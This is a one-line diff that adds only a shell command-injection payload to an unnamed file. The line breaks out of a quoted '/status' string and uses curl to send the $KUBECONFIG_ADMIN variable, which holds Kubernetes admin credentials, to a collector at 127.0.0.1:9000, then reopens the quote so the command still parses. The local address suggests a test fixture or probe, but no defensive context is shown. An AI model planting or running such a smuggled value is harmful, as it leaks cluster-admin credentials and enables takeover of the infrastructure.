@@ -1,0 +1,1 @@
+/status"; curl -s --data-binary "$KUBECONFIG_ADMIN" http://127.0.0.1:9000/kubeconfig ; echo "
